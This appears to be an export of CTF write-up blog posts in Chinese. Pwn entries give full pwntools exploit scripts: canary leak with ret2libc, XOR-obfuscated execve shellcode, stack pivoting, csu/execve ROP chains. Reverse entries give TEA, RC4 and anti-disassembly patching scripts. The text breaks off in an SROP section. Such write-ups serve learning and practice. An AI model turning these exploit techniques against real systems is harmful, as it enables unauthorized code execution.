[{"title":"[2021 鹤城杯]littleof","url":"/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/","content":"题目\n\n开启了canary保护\n所以用printf泄露canary的数值\n之后用ret2libc的方法解决\n脚本from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./littleof&#x27;)p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)elf = ELF(&quot;./littleof&quot;)# canary泄露payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;p.recvuntil(b&#x27;Do you know how to do buffer overflow?\\n&#x27;)p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary :&#123;hex(canary)&#125;&quot;)# ret2libcrdi = 0x400863ret = 0x40059eputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = 0x400789payload2 = b&#x27;a&#x27; *0x48 + p64(canary)payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload2)p.recvuntil(b&#x27;I hope you win\\n&#x27;)puts_addr = u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8, b&#x27;\\00&#x27;))print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#gdb.attach(p,&quot;b *0x0000000000400787&quot;)payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)p.sendline(payload3)p.interactive()\n\ncanary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))\n\n此时读取的还是小端序。所以在左侧补位\\x00\n收获canary接收假设我们现在要泄露的 Canary 值是 0x1122334455667700。\n步骤一：内存中的原始状态\n在程序运行的内存中，这个 Canary 值以小端序存储。这意味着它的字节顺序是反过来的。\n内存地址 (低) -&gt; Canary 字节序 (高)         \\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11 ，Canary 的最低字节是 \\x00，存储在最低地址。\n步骤二：构造并发送第一个 Payload (泄露)\n我们构造 Payload：b’a’ * 0x48 + b’b’。\n程序接收后，缓冲区被填满，b’b’ 覆盖了 Canary 的最低字节 \\x00。\n现在，内存中的 Canary 变成了： \\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11，\\x62 是字符 ‘b’ 的十六进制值。\n步骤三：程序输出泄露的数据\n程序使用 printf(“%s”, buf) 这样的方式将栈上的数据当成字符串输出。它会从 buf 开始向后打印，直到遇到第一个空字节 \\x00。\n由于我们用 b 覆盖了 Canary 的最低字节，printf 不会在这里停止，而是继续向后打印。\n它会打印出 b 加上 Canary 剩下的 7 个字节：\\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11\n步骤四：脚本接收并处理泄露数据\n我们的 Python 脚本执行 p.recvuntil(b’b’)，先接收到 b，然后执行 p.recv(7)，接收剩下的 7 个字节\\x77\\x66\\x55\\x44\\x33\\x22\\x11\n接下来，我们用 rjust(8, b’\\x00’) 来恢复 Canary，就canary的小端序情况来看，在数据左侧添一个”\\x00”,所以要用rjust（把现有数据放右边）\n最后，我们用 u64() 将这个完整的 8 字节小端序数据转换回一个整数：\ncanary &#x3D; u64(b’\\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11’)结果就是：0x1122334455667700\n至此，Canary 泄露完成。\n小端序leaked = p.recv(8)           # 收到 8 字节：b&#x27;\\x00\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde&#x27;value = u64(leaked)          # → 0xdebc9a7856341200\n\ntarget_addr = 0x401123p.send(p64(target_addr))     # → 发送 b&#x27;\\x23\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27;\n\n\n\n\n\n\n\n\n\n\n\n\n从内存读整数（canary、地址）\n✅ 是\n用u32&#x2F;u64\n\n\n向内存写整数（ROP、溢出）\n✅ 是\n用p32&#x2F;p64\n\n\n字符串（”hello”）\n❌ 否\n按正常顺序\n\n\n网络协议\n❌ 否（用大端）\n用&gt;I,&gt;Q\n\n\n文件格式（ELF、PNG）\n❌ 否\n按字节流顺序\n\n\n格式化字符串输出（%p）\n❌ 否\n直接转整数\n\n\n泄露的 hex 字符串（如 “aabbccdd”）\n❌ 否\n先bytes.fromhex()再看是否要反转\n\n\n\n","categories":["exercise_pwn"],"tags":["Canary绕过","小端序","PWN"]},{"title":"[HDCTF 2023]enc","url":"/2025/07/11/HDCTF-2023-enc/","content":"链接\n打开进入这个函数\n\nTEA\n分析之后知道\n下一步核对的v7和v8都是改变后的密文\nv9才是密钥\n解密时注意，异或的时候从后往前异或，倒着来\n脚本\n#tea解密def tea_decrypt(v, k):    v0, v1 = v[0], v[1]    delta = 0x61C88647    sum = -(delta * 32) &amp; 0xFFFFFFFF    for _ in range(32):        v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF        v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF         sum = (sum + delta) &amp; 0xFFFFFFFF    return [v0, v1] # 给定密文v9和密钥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3\n\nSMC继续看下面的函数\nsub_4113DE —&gt;sub_414C10—&gt;sub_411046—&gt;sub_414B00—&gt;sub_411221—&gt;sub_415340\n\n\n(char *)a1 或 (_BYTE *)a1 是将整数地址 a1 转换为内存指针。\n然后通过 *ptr ^= a3 修改该地址上的内容。\n\n所以是SMC\n那下一步就是找到它改变的地址的范围\n打开x32xdbg\nctrl+g输入00415340\n\nF9运行后会停在这里\n\n\n所以修改位置的位置头是0x0041D000\n长度是0x600\n所以在ida中运行脚本\n脚本\n# 导入 ida_bytes 模块，这是现代 IDA Python 推荐的字节操作方式from ida_bytes import get_byte, patch_byte # 定义操作的起始地址、结束地址和异或密钥start_address = 0x41d000end_address = 0x41E600 # range函数不包含end_addressxor_key = 3 print(&quot;开始批量异或修改...&quot;)# 遍历指定范围内的每个字节并进行异或操作for i in range(start_address, end_address):    original_byte = get_byte(i)      # 使用 get_byte 从 ida_bytes 模块读取字节    new_byte = original_byte ^ xor_key    patch_byte(i, new_byte)          # 使用 patch_byte 从 ida_bytes 模块写入字节print(&quot;修改完成&quot;)\n\n之后再在函数头按U结构\n再选中范围去C\n\n就可以了\n\n\n发现是RC4加密\n脚本\nkey=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27;  def rc4_init(s,key,rc4number):    for i in range(rc4number):        s[i]=i    j=0    for i in range(rc4number):        j=(j+s[i]+ord(key[i%len(key)]))%rc4number        temp=s[i]        s[i]=s[j]        s[j]=temp def rc4_endecode(s,content,rc4number):    i=0    j=0    for k in range(len(content)):        i=(i+1)%rc4number        j=(j+s[i])%rc4number        temp=s[i]        s[i]=s[j]        s[j]=temp        t=(s[i]+s[j])%rc4number        content[k]=chr(content[k]^s[t])    content=&#x27;&#x27;.join(content)    print(content)  rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)\n\n","categories":["exercise_re"],"tags":["RE","TEA","SMC"]},{"title":"NewStar2024 pwn","url":"/2025/08/15/NewStar2024-pwn/","content":"week2Bad Asm\n所以通过编写汇编代码来写这段shellcode\n通过异或等操作来绕过不能有00以及syscall 或 sysenter 指令汇编码的限制\n脚本\nfrom pwn import *from Crypto.Util.number import long_to_bytes, bytes_to_longcontext.log_level=&#x27;debug&#x27;context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]ELFpath = &#x27;./pwn&#x27;p = remote(&#x27;192.168.137.1&#x27;, 40273)shellcode=&#x27;&#x27;&#x27;; // 目标: 执行 execve(&quot;/bin/sh&quot;, 0, 0) 的 syscallmov rsp, rdi  #rsp指向dest（sellcode）的头部add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop，任意一个可读写段即可，我们这里刚好有rdi中存储的 shellcode 的段的起始位置，正好这个段有读写权限，就直接拿来在 0x848 偏移的位置当作栈顶了（加偏移是为了防止某些操作破坏写入的 shellcode）mov rsi, 0x4028636f2e49226fmov rdx, 0x4040104040204040xor rsi, rdxpush rsi       ; // 异或搓出来&#x27;/bin/sh\\x00&#x27;(正好 8 字节，一个寄存器能存下) 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置 mov ax, 0x454fxor ax, 0x4040mov rsi, rdiadd sil, 0x40mov [rsi], ax  ; // 搓出来 syscall 的机器码 0f 05 并且拼接到当前 shellcode 后面。 mov rdi, rsp   ; // 设置 rdi，指向之前 push 到栈上面的 &#x27;/bin/sh\\x00&#x27;xor rsi, rsixor rdx, rdx   ; // 设置 rsi, rdxxor rax, raxmov al, 59     ; // 设置 execve 的系统调用号&#x27;&#x27;&#x27;p.sendafter(&quot;Input your Code :&quot;, asm(shellcode).ljust(0x40, b&#x27;\\x90&#x27;))p.interactive()\n\n\n\nEz_fmtInverted World\n此时刚执行call read函数，因为是64位的程序参数是通过寄存器准备的\nmov rsi, rax\nmov edx, 0x512等\n这些指令是在 call _read之前执行，它们将参数值放入相应的寄存器中，所以接下来要压入read函数的返回地址\n看rip的地址，应为这个是\n计算距离应该填充\n","categories":["WP"],"tags":["PWN","WP"]},{"title":"[ZJCTF 2019]Login","url":"/2025/08/26/ZJCTF-2019-Login/","content":"题目\n\n发现代码有点不容易分析，但是题目中存在直接的后门函数\n所以题目应该不难\n在check函数中\n\n看到这个函数的参数被执行了\n所以我们可以把这个参数直接替换为后门函数的地址（第一个参数存在rdi中）\n因为这个函数是在main函数中被调用的\n我们去main函数中找到rdi的赋值\n\nlea rax, [rbp+var_130] 这条指令的意思就是：**计算 [rbp+var_130] 这个内存地址，然后把这个地址本身的值赋给 rax 寄存器。**符合我们后面看到的a1指针的情况\n图中可以看到rdi的值应该是[rbp+var_130]\n且在password_checker之后把[rbp+var_130]的值赋给rax\n所以我们可以去password_checker查看其位置，目标就是找到它的相对位置\n\n看到距离ret是0x18\nmain接下来会调用read_password函数（这两个都是main调用的，可以根据其相当于ret的位置去判断其实际位置）\n会把栈清空，然后建它自己的的栈空间\n\n可以看到从读入位置s到我们执行的参数位置偏移是0x48\n脚本\nfrom pwn import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#p=process(&quot;./login&quot;)elf=ELF(&quot;./login&quot;)#gdb.attach(p,&quot;b*0x400B68&quot;)p=remote(&quot;node5.buuoj.cn&quot;,29403)p.recvuntil(b&quot;username:&quot;)p.sendline(b&quot;admin&quot;)#p.recvuntil(b&quot;password:&quot;)pay=b&quot;2jctf_pa5sw0rd&quot;pay=pay.ljust(0x48,b&quot;\\x00&quot;)pay+=p64(0x400E88)p.sendline(pay)p.interactive()\n\n","categories":["exercise_pwn"],"tags":["PWN","rax替代"]},{"title":"[HNCTF 2022 WEEK4]flower plus","url":"/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","content":"链接\n花指令分析\n发现花指令\ndb 0C7h 的“垃圾”作用： 0x4012A6 处的 db 0C7h 是一个数据字节。它被 jnz 指令跳转到，但它本身不是一个有意义的执行路径。它的存在是为了干扰反汇编器的线性分析，使其认为这里存在一个实际的代码分支。反汇编器可能会将 0C7h 解码为 MOV EDI, EBP (如果加上前缀的话)，或者只是一个数据字节，无论哪种，都与正常逻辑不符。\n为了不影响汇编器的分析\n要把这里进行判断和跳转的都NOP掉\n将 push ebx 和 pop ebx 都 NOP 掉的主要原因是为了完全消除这个花指令的副作用和混淆链：\n\n栈平衡： push ebx 和 pop ebx 是一对用来维护栈平衡的操作。如果它们是花指令的一部分，并且它们保存&#x2F;恢复的寄存器值在中间被修改（例如被 xor ebx, ebx 清零），那么这对 push/pop 实际上是无效的或者说是误导性的。它们的存在只是为了让代码看起来更复杂，或者在某些情况下通过不匹配的栈操作来干扰分析。\n\n如果只 NOP 掉中间的跳转，保留 push ebx 和 pop ebx，那么在 push ebx 之后，ebx 立即被清零，然后又被 pop ebx 恢复。这可能会导致 ebx 的值在函数中被不必要地改变和恢复，即使它不是真正需要的。\n\n\n\n第二个花指令\n\n\n执行 0x401358: call loc_40135E:\ncall 指令本身占用 5 个字节 (E8 01 00 00 00)。\ncall 指令的下一条指令的地址是 0x401358 + 5 = 0x40135D。\nCPU 将 0x40135D 压入栈中。此时，0x40135D 就是栈顶的返回地址。\nCPU 跳转到 0x40135E 开始执行。\n\n\n执行 0x40135E: db 36h:\n这是一个数据字节，但是 CPU 会尝试将其作为指令执行。这通常是花指令的混淆手法，它可能不会导致崩溃，而是作为无效指令执行或者被后续指令覆盖。\n假设它被执行了，或者被跳过了，程序流会继续到 0x40135F。\n\n\n执行 0x40135F: add dword ptr [esp], 8:\n这条指令非常关键。\n[esp] 指的是栈顶的内存地址。当前栈顶存放的是 0x40135D（原始返回地址）。\nadd dword ptr [esp], 8 的作用是：将栈顶存放的那个 dword 值（即 0x40135D）加上 8，然后把结果再写回栈顶。\n所以，栈顶的返回地址从 0x40135D 变成了 0x40135D + 8 = 0x401365。\n\n\n执行 0x401362: retn:\nretn 指令会从栈顶弹出地址。\n它弹出的不再是原始的 0x40135D，而是被 add 指令修改后的 0x401365。\nCPU 跳转到 0x401365 开始执行。\n\n\n\n原始的返回地址是 0x40135D。如果没有任何 add 操作，retn 会回到 0x40135D。\n但是，add dword ptr [esp], 8 将返回地址修改成了 0x401365。\n这意味着当 retn 执行时，程序会直接从 0x401365 开始执行，\n所以，add dword ptr [esp], 8 的作用就是人为地调整了 retn 的目标地址，使其跳过了 0x40135D 到 0x401364（包含 0x401364）这段区域，直接跳转到 0x401365 去执行。 这就是这种花指令用于混淆控制流的一种常见手法。\n所以NOP的范围包括0x401364\n\n为什么是花指令\n正常情况下，call 指令会直接跳转到被调用函数的入口点。这个入口点应该是一条合法的可执行指令。\n但是在这里，当 call 指令跳转到 0x40135E 时，它遇到的第一个字节是 db 36h。\n\n反汇编器困惑： 静态反汇编器在 0x40135E 看到 db 36h 时，通常会认为这是数据，而不是代码。它可能因此停止对该区域的代码分析，或者产生错误的解码。\nCPU 行为： CPU 会尝试将 36h 作为指令来解码执行。如前所述，36h 是一个段超越前缀（SS:）。CPU 会尝试将其与随后的字节组合成一条指令。\n如果 36h 后面跟着的字节（即 add dword ptr [esp], 8 的字节码 83）不能与 36h 形成一条合法的指令，或者形成了程序员不期望的指令，这就会导致程序行为异常或崩溃。\n然而，在某些复杂的混淆中，可能会利用这种前缀的特性，使得处理器在特定上下文中能正确执行，而反汇编器却难以理解。\n\n\n\ncall花指令识别\ncall 目标是数据字节或非指令区。\ncall 后面紧跟数据定义。\ncall 目标内部有 add dword ptr [esp], N 来修改返回地址。\n最后以 retn 结束，并且 retn 之后的字节可能也是混淆的一部分。\n脚本stae=0x00401006end=0x00401402 for i in range(stae, end+1):   if get_wide_dword(i)== 0x01740275:       patch_dword(i,0x90909090)       patch_dword(i-4,0x90909090)       patch_word(i+4,0x9090)       patch_word(i-5,0x90)   if get_wide_dword(i)== 0x000001E8:        if get_wide_dword(i+4)== 0x8336E800:            patch_dword(i,0x90909090)            patch_dword(i+4,0x90909090)            patch_dword(i+8,0x90909090)            patch_byte(i+12,0x90)\n\n然后选中函数头U解构\n\nC重构一下就好\n就可以看待main函数了\n\n在这个函数中看到RC4的标志\n\n之后经过一个异或\n然后进入sub_40128F进行核验\n\n\n这是其加密后的值\n右键\n提取数据\n异或脚本\na=[0x0000004D, 0xFFFFFFE6, 0x00000049, 0xFFFFFF95, 0x00000003, 0x0000002D, 0x0000002B, 0xFFFFFFBA,     0xFFFFFFEA, 0x0000006D, 0xFFFFFFFF, 0x00000059, 0x00000070, 0x00000000, 0x0000001B, 0xFFFFFFA9,     0x0000002C, 0xFFFFFFB0, 0x00000032, 0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2,     0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1):    a[i]^=a[(i+1)%len(a)]    print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers:    unsigned_32bit_num = num &amp; 0xFFFFFFFF    hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8)    hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4):    print(&quot;, &quot;.join(hex_output[i:i+4]))    #十进制50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13    #十六进制0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032\n\n​\t\n处理RC4\ndef to_unsigned_32bit_and_byte(n):    if n &lt; 0:        n += 0x100000000     return n &amp; 0xFFdef to_signed_32bit(n):    if n &gt; 0x7FFFFFFF:        n -= 0x100000000    return ndef to_unsigned_32bit(n):    if n &lt; 0:        n += 0x100000000    return n &amp; 0xFFFFFFFF# --- RC4 阶段 1: KSA (密钥调度算法) ---# 定义: 初始化 S 盒并根据密钥对其进行置换。# 输入: 密钥字节 (key_bytes), 密钥长度模数 (key_mod_len)# 输出: 经过初始置换的 S 盒 (s_box)def s_init(key_bytes, key_mod_len):    s_box = list(range(256))    v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)]         j = 0    for i in range(256):        j = (v4_ksa_t_box[i] + j + s_box[i]) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_box# --- RC4 阶段 2 &amp; 3: PRGA (伪随机生成算法) &amp; 最终数据处理 ---# 定义:# PRGA: 根据 S 盒生成伪随机密钥流。# 最终数据处理: 使用生成的密钥流对输入数据进行异或操作。# 输入: 待处理数据数组 (data_array), 密钥字节 (key_bytes), #       密钥长度模数 (key_mod_len), 数据长度 (data_len)# 输出: 经过处理后的数据数组 (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len):    # KSA 阶段的调用    s_box = s_init(key_bytes, key_mod_len)     l = 0    v9 = 0        # 用于存储生成的密钥流    generated_keystream = [0] * data_len     # --- RC4 阶段 2: PRGA (生成密钥流) ---    for k in range(data_len):         l = (l + 3) % 256         v9 = (v9 + s_box[l] + 1) % 256                 s_box[l], s_box[v9] = s_box[v9], s_box[l]                generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256]     # --- RC4 阶段 3: 最终数据处理 (异或操作) ---    result_am_array = list(data_array)    for i in range(data_len):        result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^                                               to_unsigned_32bit(generated_keystream[i]))            return result_am_arrayif __name__ == &quot;__main__&quot;:    rc4_key_string = &#x27;Hello_Ctfers!!!&#x27;    key_as_byte_list = list(map(ord, rc4_key_string))    if len(key_as_byte_list) &lt; 16:        key_as_byte_list.append(0)    KEY_MOD_LEN = 16    am_initial_hex = [        0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF,        0x0000007A, 0x00000079, 0x00000054, 0x0000007F,        0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD,        0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F,        0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88,        0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5,        0x00000007, 0x0000004B, 0x00000032    ]    am_initial_data = [to_signed_32bit(h) for h in am_initial_hex]    n = len(am_initial_data)    final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n)        output_chars = bytearray()    for val in final_am_values:        output_chars.append(to_unsigned_32bit_and_byte(val))    print(output_chars.decode(&#x27;latin-1&#x27;))    #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["exercise_re"],"tags":["RE","花指令"]},{"title":"ciscn_2019_es_2","url":"/2025/07/24/ciscn-2019-es-2/","content":"题目\n\n\n很明显的栈溢出漏洞，但是可操作空间太小，只能覆盖到ret，所以要用栈迁移\n\n有system函数，但是需要自己传参，可以把&#x2F;bin&#x2F;sh字符段放在栈上\n有两次输入，第一次输入可以用来泄露ebp的地址\n第二次要根据泄露地址去找加上偏移得到s的头部，在那里构造我们的后门函数，之后通过ret返回s头部执行这个后门函数。\n先查看ebp距离s的实际距离（gdb动态调试查看）\n\n相距0xffffcf18 - 0xffffcee0 &#x3D; 0x38\n不能直接通过下面这种方式查看，因为现在的操作系统默认开启了ASLR，所以栈上的地址一直会变化\n\n接着构造我们的后门函数\n\n且因为跳转到s后还要执行，所以程序不能崩溃 ，如果s可以直接跳转到后门函数就可以直接把地址写在ret上\npayload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)\n\npayload.ljust(0x28, b&#39;\\x00&#39;) 中必须使用 b&#39;\\x00&#39; 因为printf会在接下来的数据中找符合%s的数据，如果没有”&#x2F;x00”，他可能去读取继续往后读到栈上的数据，%s时字符串，printf读到不可打印的字符会引发错误\nleave ret解释\nleave\nmov esp, ebp:把esp移动到ebp-0x38的位置（ebp-0x38)其实就是aaaa的位置\npop ebp：把aaaa这一块pop出去了\nret\npop eip:,把栈顶的system函数pop出去作为返回地址\n脚本from pwn import *#p=process(&quot;./ciscn_2019_es_2&quot;)p=remote(&quot;node5.buuoj.cn&quot;,25671)sys=0x08048400main=0xdeadbeefleave=0x080485FDp.recvuntil(b&quot;name?\\n&quot;)payload=b&quot;a&quot;*0x27+b&quot;b&quot;p.send(payload)p.recvuntil(b&quot;b&quot;)s=u32(p.recv(4))-0x38print(hex(s))payload=b&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+16)+b&quot;/bin/sh&quot;payload=payload.ljust(0x28,b&quot;\\x00&quot;)payload+=p32(s)+p32(leave)p.sendline(payload)p.interactive()\n\n\n\n收获栈空间识别\n偏移量  │ 寄存器/标识符     |    地址     |    内容         &lt;-- 解释-------+------------------------------------------00:0000│       esp         0xffffced0 —▸ 0x80486ca ◂— dec eax /* &#x27;Hello, %s\\n&#x27; */\n\n0xffffced0: ESP 寄存器当前指向的内存地址。\n—▸ 0x80486ca: ESP 指向的内存地址里存储的值，它又是一个地址，指向了 0x80486ca。\n◂— dec eax /\\* &#39;Hello, %s\\n&#39; \\*/: 对 0x80486ca 这个地址的反汇编&#x2F;注释，这里显示它是一条指令的起始，并且其附近有字符串 “Hello, %s\\n”。\n要找到存放内容是111111的位置，就是11111直接指向的位置0xffffcee0\nesp与s的距离一直疑惑不是相距0x28吗，为什么要看这个0x38,看了很多大佬的wp也没有说的，查了才知道还要考虑堆栈平衡:joy:\n🧠 关键点在于：\nchar s[0x28];\n\n这个数组虽然是 0x28 字节，但 它不是从 ebp - 0x28 到 ebp，而是从 ebp - 0x2c 到 ebp - 4。\n也就是说，编译器会：\n\n为变量 s[0x28] 分配 0x28 字节；\n还会额外分配 对齐空间（padding），使整个栈帧是对齐的；\n所以，真正变量起始地址是 ebp - 0x2c，不是 ebp - 0x28。\n\n👉 在 32 位程序中，变量 char s[0x28] 通常从 ebp - 0x2c 开始，而不是 ebp - 0x28。\n\n在 32 位程序里，esp 在建立栈帧时，常常是 为了给局部变量和返回地址对齐到 16 字节，因此会多分配几个字节；\n所以 sub esp, 0x2c 是非常常见的；\n即使变量只有 0x28 字节，编译器会额外多给 4 字节 padding，形成 0x2c。\n\n\n在这里也可以看到它开辟了不止0x28个空间，所以才要gdb调试看它实际的\n                 高地址 (栈底，向高地址增长)                  ^                  |+-----------------+-------------------+|     函数参数    |                   |+-----------------+-------------------+|    返回地址     |                   |  (调用 func() 后返回到这里的地址)+-----------------+-------------------+|  保存的旧 EBP   |  (OLD_SAVED_EBP)  |  &lt;- (0x080485FD - leave; ret 处的 EBP 值)+-----------------+-------------------+|    Padding      |   (通常是 4 字节)   |  &lt;- (如果你说 s 从 ebp - 0x2c 开始，那么这部分是 ebp-0x2c 到 ebp-0x28 之间的填充)+-----------------+-------------------+  &lt;- **ebp - 0x28**|                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||   char s[0x28]  |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   ||                 |                   |+-----------------+-------------------+  &lt;- **ebp - 0x2c** (数组 s 的起始地址)|    其他局部变量 |                   ||    （如果有）   |                   |+-----------------+-------------------+|      ......     |                   |+-----------------+-------------------+|      当前 ESP   |                   |  &lt;- (ESP 寄存器指向的地址)+-----------------+-------------------+                  |                  v                  低地址 (栈顶，向低地址增长)\n\n\n\n","categories":["exercise_pwn"],"tags":["PWN","gdb"]},{"title":"ciscn_2019_s_3","url":"/2025/08/02/ciscn-2019-s-3/","content":"题目\n\n\n没有后门函数，也没有能用来泄露libc地址的东西\n\n但是看到有execve和一些对寄存器的操作，考虑csu\n在栈上写入&#x2F;bin&#x2F;sh,之后调用它\n数据在栈的位置不是固定的，但是偏移是固定的\n可以通过read和write来泄露栈上的地址\nscu泄露地址\nbuf的起始位置是0x7fffffffdd70，70到80之间是buf的16空间\n栈上0x7fffffffdd90对应的数据是一个栈 上的地址所以选择读取这个位置的地址\n并计算出它和buf之间的偏移以精准定位buf的头部\n且\n这个函数返回时直接ret，没有进行pop ebp的操作，所以在构造payload的时候不需要覆盖ebp\n脚本\npayload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))\n\n\n\n调用64位时，设计后门函数需要rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;\nrax&#x3D;59地址已经找到了\nROPgadgets命令查看，发现只有对rdi和rsi的s操作\n剩下的就是基本的csu了\n\nrbx_rbp_r12_r13_r14_r15#r13&gt;rdx r14&gt;rsi r15&gt;edi#call r12+rbx*8#add     rbx, 1#cmp     rbx, rbp\n\n设置好rdx、rsi、rdi，然后调用 syscall\n首先r14和r13一定要赋值为0，而且r15d的值\n函数会跳转到r12+rbx*8,让它最后修改rdi然后执行调用syscall，所以r12要赋值为payload中的pop rdi的地方，rbx赋值0\n且只调用一次\n所以rbp&#x3D;1\n最终执行\nmov    rax, 59       ; syscall number for execvesyscall\n\n脚本\npayload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive()\n\n注意\n✅ mov edi, r15d和 rdi 的关系\nmov edi, r15d\n\n只看语法，是：\n\n把 r15d的值（32 位）赋给 edi（也是 32 位）\n\n但这里有个关键点：\n\n在 x86-64 架构中，对 rdi 的低 32 位写入（edi）时，高 32 位会被清零！\n\n🔍 举个例子\nmov rdi, 0x4141414141414141mov edi, 0x42424242\n\n执行完第二条指令后，rdi的值是：\nrdi == 0x0000000042424242\n\n也就是说：\n\n写 edi 相当于先清空 rdi，再写低 32 位\n\nmov edi, r15d其实等价于：\nrdi = r15 &amp; 0xffffffff\n\n所以你能用它来设置 rdi 的值前提是你设置的 r15 是一个 32 位以内的地址（或者值），比如 &#x2F;bin&#x2F;sh 的地址必须低于 0x100000000，否则会丢高位，导致 execve 崩溃或 syscall 参数错误\n所以要之后再放设置rdi的值\n脚本from pwn import *#p=process(&quot;./ciscn_s_3&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28493)syscall=0x400517vuln=0x4004EDrdi=0x4005a3rax=0x4004E2pop6=0x40059A#rbx_rbp_r12_r13_r14_r15mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi            #call r12+rbx*8            #add     rbx, 1            #cmp     rbx, rbp        payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive()\n\n\n\nSROP\n题目中也有sigframe\nSROP 攻击的原理\n\n内核保存上下文（步骤 ①）：当程序接收到信号时，内核会暂停程序的执行，并自动将当前所有寄存器（rax, rdi, rsi, rdx, rip, rsp 等）的状态保存到一个特殊的结构体中，这个结构体叫做 